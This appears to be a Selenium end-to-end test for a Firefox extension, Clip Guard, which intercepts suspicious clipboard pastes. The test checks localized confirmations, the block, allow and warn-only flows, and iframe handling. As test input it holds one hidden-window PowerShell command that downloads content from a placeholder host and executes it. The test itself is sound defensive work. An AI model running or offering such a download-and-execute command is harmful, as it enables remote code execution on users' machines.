import { createServer } from "node:http";
import { copyFile, mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { By, Builder, Key, until } from "selenium-webdriver";
import firefox from "selenium-webdriver/firefox.js";
import { start as startGeckodriver } from "geckodriver";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const firefoxPath = "C:\\Program Files\\Mozilla Firefox\\firefox.exe";
const extensionPath = path.join(root, "dist", "firefox.zip");
const benign = "ordinary documentation text";
const suspicious = 'powershell -w hidden -c "iwr exemplo.invalid/a | iex"';
const localized = {
  "pt-BR": {
    copy: "Clip Guard: Cópia Livre ✅",
    paste: "Clip Guard: Cola Livre ✅",
    prompt: "Colagem bloqueada pelo Clip Guard",
    keep: "Manter bloqueado",
    allow: "Colar mesmo assim",
    warning: "Aviso do Clip Guard: colagem suspeita permitida"
  },
  "en-US": {
    copy: "Clip Guard: Copy OK ✅",
    paste: "Clip Guard: Paste OK ✅",
    prompt: "Paste blocked by Clip Guard",
    keep: "Keep blocked",
    allow: "Paste anyway",
    warning: "Clip Guard warning: suspicious paste allowed"
  },
  es: {
    copy: "Clip Guard: Copia libre ✅",
    paste: "Clip Guard: Pegado libre ✅",
    prompt: "Clip Guard bloqueó el pegado",
    keep: "Mantener bloqueado",
    allow: "Pegar de todos modos",
    warning: "Aviso de Clip Guard: pegado sospechoso permitido"
  }
};
const pageHtml = `<!doctype html><meta charset="utf-8"><title>Clip Guard test</title>
<input id="input"><textarea id="textarea"></textarea>
<div id="editable" contenteditable="true"></div>
<script>
  for (const selector of ["#input", "#textarea", "#editable"]) {
    document.querySelector(selector).addEventListener("paste", (event) => {
      if (event.defaultPrevented) return;
      const text = event.clipboardData?.getData("text/plain") || "";
      const target = event.currentTarget;
      if (target.isContentEditable) target.textContent += text;
      else target.setRangeText(text, target.selectionStart, target.selectionEnd, "end");
    });
  }
</script>`;
const server = createServer((_request, response) => {
  response.writeHead(200, { "content-type": "text/html; charset=utf-8" });
  response.end(pageHtml);
});
const outcomes = [];
let geckodriver;

async function record(name, action) {
  try {
    await action();
    outcomes.push({ name, passed: true });
  } catch (error) {
    outcomes.push({ name, passed: false, error: String(error?.message || error).split("\n")[0] });
  }
}

async function waitForState(driver, state) {
  await driver.wait(async () => driver.executeScript(
    "return document.querySelector('[data-clip-guard-state]')?.getAttribute('data-clip-guard-state') === arguments[0]",
    state
  ), 7000);
}

async function shadowText(driver, selector) {
  const host = await driver.findElement(By.css("[data-clip-guard-state]"));
  const shadow = await host.getShadowRoot();
  const element = await shadow.findElement(By.css(selector));
  return element.getText();
}

async function shadowCount(driver, selector) {
  const host = await driver.findElement(By.css("[data-clip-guard-state]"));
  const shadow = await host.getShadowRoot();
  return (await shadow.findElements(By.css(selector))).length;
}

async function triggerPaste(driver, selector, text) {
  return driver.executeScript(({ selector: targetSelector, text: value }) => {
    const target = document.querySelector(targetSelector);
    target.focus();
    const transfer = new DataTransfer();
    transfer.setData("text/plain", value);
    const event = new Event("paste", { bubbles: true, cancelable: true });
    Object.defineProperty(event, "clipboardData", { value: transfer });
    target.dispatchEvent(event);
    return event.defaultPrevented;
  }, { selector, text });
}

async function getValue(driver, selector) {
  return driver.executeScript((query) => {
    const element = document.querySelector(query);
    return element.isContentEditable ? element.textContent : element.value;
  }, selector);
}

async function setValue(driver, selector, value) {
  await driver.executeScript(({ query, text }) => {
    const element = document.querySelector(query);
    if (element.isContentEditable) element.textContent = text;
    else element.value = text;
  }, { query: selector, text: value });
}

async function runLocale(locale) {
  let driver;
  let profilePath;
  try {
    const languagePack = locale === "es" ? process.env.FIREFOX_ES_LANGPACK : null;
    if (languagePack) {
      profilePath = await mkdtemp(path.join(os.tmpdir(), "clip-guard-firefox-locale-"));
      const extensionsPath = path.join(profilePath, "extensions");
      await mkdir(extensionsPath);
      await copyFile(
        languagePack,
        path.join(
          extensionsPath,
          "langpack-es-ES@firefox.mozilla.org.xpi"
        )
      );
    }
    const options = new firefox.Options()
      .setBinary(firefoxPath)
      .addArguments("-headless")
      .setPreference("intl.locale.requested", locale)
      .setPreference("intl.locale.matchOS", false)
      .setPreference("dom.events.testing.asyncClipboard", true)
      .setPreference("dom.events.asyncClipboard.clipboardItem", true);
    if (profilePath) options.setProfile(profilePath);
    driver = await new Builder()
      .usingServer("http://127.0.0.1:4444")
      .forBrowser("firefox")
      .setFirefoxOptions(options)
      .build();
    await driver.installAddon(extensionPath, true);
    const browserLanguage = await driver.executeScript("return navigator.language");
    const origin = `http://127.0.0.1:${server.address().port}`;
    await driver.get(origin);

    await record(`${locale}: confirmação de cópia benigna`, async () => {
      await driver.executeScript("return navigator.clipboard.writeText(arguments[0])", benign);
      await waitForState(driver, "free-copy");
      const copyText = await shadowText(driver, '[role="status"]');
      if (copyText !== localized[locale].copy) {
        throw new Error(`Copy confirmation was "${copyText}"`);
      }
      for (let count = 0; count < 3; count += 1) {
        await driver.executeScript("return navigator.clipboard.writeText(arguments[0])", benign);
      }
      await driver.wait(async () => await shadowCount(driver, ".free-toast") === 1, 2000);
      if (await shadowCount(driver, ".free-toast") !== 1) {
        throw new Error("Repeated confirmations stacked instead of replacing the toast");
      }
      if (!browserLanguage.toLowerCase().startsWith(locale.toLowerCase().replace("_", "-"))) {
        throw new Error(`Firefox language mismatch: ${browserLanguage}`);
      }
    });

    await record(`${locale}: colagem benigna entra no campo`, async () => {
      await setValue(driver, "#input", "");
      if (await triggerPaste(driver, "#input", benign)) {
        throw new Error("Benign paste was prevented");
      }
      await driver.wait(async () => await getValue(driver, "#input") === benign, 5000);
      await waitForState(driver, "free-paste");
      const pasteText = await shadowText(driver, '[role="status"]');
      if (pasteText !== localized[locale].paste) {
        throw new Error(`Paste confirmation was "${pasteText}"`);
      }
    });

    await record(`${locale}: bloquear mantém vazio; permitir reinsere texto`, async () => {
      await setValue(driver, "#input", "");
      if (!await triggerPaste(driver, "#input", suspicious)) {
        throw new Error("Suspicious paste was not prevented");
      }
      if (await getValue(driver, "#input")) throw new Error("Blocked paste changed the field");
      await waitForState(driver, "paste-block-dialog");
      const prompt = await shadowText(driver, '[role="alertdialog"]');
      for (const text of [
        localized[locale].prompt,
        localized[locale].keep,
        localized[locale].allow
      ]) {
        if (!prompt.includes(text)) {
          throw new Error(`Localized prompt missing "${text}": ${prompt}`);
        }
      }
      await driver.actions().sendKeys(Key.TAB).sendKeys(Key.ENTER).perform();
      try {
        await driver.wait(async () => await getValue(driver, "#input") === suspicious, 5000);
      } catch {
        const details = await driver.executeScript(() => ({
          value: document.querySelector("#input").value,
          state: document.querySelector("[data-clip-guard-state]")?.getAttribute("data-clip-guard-state"),
          pending: window.__clip_guard_hook_state__?.pendingPaste &&
            Object.keys(window.__clip_guard_hook_state__.pendingPaste),
          active: document.activeElement?.outerHTML
        }));
        throw new Error(`Paste approval did not insert text: ${JSON.stringify(details)}`);
      }
    });

    await record(`${locale}: modo só avisar permite a colagem suspeita`, async () => {
      await setValue(driver, "#input", "");
      await driver.executeScript(() => {
        window.__clip_guard_hook_state__.protectionMode = "warn";
      });
      if (await triggerPaste(driver, "#input", suspicious)) {
        throw new Error("Warn-only mode prevented the paste");
      }
      await driver.wait(async () => await getValue(driver, "#input") === suspicious, 5000);
      await waitForState(driver, "paste-warning");
      const warning = await shadowText(driver, '[role="status"]');
      if (!warning.includes(localized[locale].warning)) {
        throw new Error(`Warn-only text was "${warning}"`);
      }
      await driver.executeScript(() => {
        window.__clip_guard_hook_state__.protectionMode = "block";
      });
    });

    await record(`${locale}: textarea e contenteditable permanecem bloqueados com Escape`, async () => {
      for (const selector of ["#textarea", "#editable"]) {
        await setValue(driver, selector, "");
        if (!await triggerPaste(driver, selector, suspicious)) {
          throw new Error(`${selector}: paste was not prevented`);
        }
        await waitForState(driver, "paste-block-dialog");
        await driver.actions().sendKeys(Key.ESCAPE).perform();
        await new Promise((resolve) => setTimeout(resolve, 100));
        if (await getValue(driver, selector)) {
          throw new Error(`${selector}: Escape allowed the paste`);
        }
      }
    });

    await record(`${locale}: iframe benigno gera toast somente no documento superior`, async () => {
      await driver.executeScript((url) => {
        const frame = document.createElement("iframe");
        frame.id = "test-frame";
        frame.src = url;
        document.body.append(frame);
      }, origin);
      const frame = await driver.findElement(By.id("test-frame"));
      await driver.switchTo().frame(frame);
      await driver.wait(async () => driver.executeScript(
        "return Boolean(window.__clip_guard_hook_state__?.listenersInstalled)"
      ), 5000);
      await driver.executeScript("return navigator.clipboard.writeText(arguments[0])", benign);
      await driver.switchTo().defaultContent();
      await waitForState(driver, "free-copy");
    });
  } finally {
    await driver?.quit().catch(() => {});
    if (profilePath) await rm(profilePath, { recursive: true, force: true });
  }
}

try {
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  geckodriver = await startGeckodriver({ port: 4444, spawnOpts: { stdio: "ignore" } });
  const deadline = Date.now() + 10000;
  while (Date.now() < deadline) {
    try {
      if ((await fetch("http://127.0.0.1:4444/status")).ok) break;
    } catch {}
    await new Promise((resolve) => setTimeout(resolve, 100));
  }
  for (const locale of ["pt-BR", "en-US", "es"]) await runLocale(locale);
} finally {
  geckodriver?.kill();
  await new Promise((resolve) => server.close(resolve));
}

const passed = outcomes.filter(({ passed: result }) => result).length;
const report = [
  "# Clipboard and localization E2E (Firefox)",
  "",
  `Result: ${passed}/${outcomes.length} scenarios passed.`,
  "",
  "| Scenario | Result | Note |",
  "| --- | --- | --- |",
  ...outcomes.map(({ name, passed: result, error }) =>
    `| ${name} | ${result ? "PASS" : "FAIL"} | ${error ?? ""} |`
  ),
  ""
].join("\n");
await writeFile(path.join(root, "reports", "firefox-enhancements.md"), report);
console.log(report);
if (passed !== outcomes.length) process.exitCode = 1;
